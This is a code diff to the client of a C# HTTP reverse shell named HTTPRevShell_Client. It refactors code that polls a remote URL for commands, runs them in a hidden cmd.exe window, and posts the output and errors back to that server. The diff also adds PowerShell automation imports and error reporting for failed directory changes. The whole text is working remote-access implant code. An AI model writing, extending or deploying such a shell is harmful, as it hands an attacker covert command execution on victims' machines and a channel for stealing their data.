@@ -4,6 +4,8 @@ using System.Net;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Diagnostics;
+using System.Management.Automation;
+using System.Collections.ObjectModel;
 
 namespace HTTPRevShell_Client
 {
@@ -22,37 +24,40 @@ namespace HTTPRevShell_Client
                 {
                     break;
                 }
-                else if (cmd.StartsWith("cd ")) {
-                    location = ChangeLocation(cmd, location);
+                else if (cmd.StartsWith("cd ")) 
+                {
+                    location = ChangeLocation(cmd, location, url);
                 }
                 else
                 {
-                    Process process = new Process();
-                    process.StartInfo.FileName = "cmd.exe";
-                    process.StartInfo.RedirectStandardInput = true;
-                    process.StartInfo.RedirectStandardOutput = true;
-                    process.StartInfo.RedirectStandardError = true;
-                    process.StartInfo.CreateNoWindow = true;
-                    process.StartInfo.UseShellExecute = false;
-                    process.StartInfo.WorkingDirectory = IsRoot(location);
-                    process.StartInfo.Arguments = string.Concat("/C ", cmd);
-                    process.Start();
-                    process.WaitForExit();
-                    string output = process.StandardOutput.ReadToEnd();
-                    string error = process.StandardError.ReadToEnd();
-                    process.Close();
+                    (string output, string error) = RunCMD(cmd, location);
 
+                    output = (error.Length != 0) ? String.Concat("#!#", error) : output;
 
-                    if (error.Length != 0)
-                    {
-                        Post(url, error);
-                    }
-                    else
-                    {
-                        Post(url, output);
-                    }
+                    Post(url, output);
                 }
             }
+        }
+
+        // Run CMD Command
+        public static (string, string) RunCMD(string cmd, string location)
+        {
+            Process process = new Process();
+            process.StartInfo.FileName = "cmd.exe";
+            process.StartInfo.RedirectStandardInput = true;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.RedirectStandardError = true;
+            process.StartInfo.CreateNoWindow = true;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.WorkingDirectory = IsRoot(location);
+            process.StartInfo.Arguments = string.Concat("/C ", cmd);
+            process.Start();
+            process.WaitForExit();
+            string output = process.StandardOutput.ReadToEnd();
+            string error = process.StandardError.ReadToEnd();
+            process.Close();
+
+            return (output, error);
         }
 
         // Check Root Dir
@@ -66,7 +71,7 @@ namespace HTTPRevShell_Client
         }
 
         // Change directory
-        public static string ChangeLocation(string cmd, string location)
+        public static string ChangeLocation(string cmd, string location, string url)
         {
             string bkp = location;
             cmd = cmd.Substring(3);
@@ -102,6 +107,7 @@ namespace HTTPRevShell_Client
             }
             else
             {
+                Post(url, "#!#Directory does not exist");
                 return bkp;
             }
         }
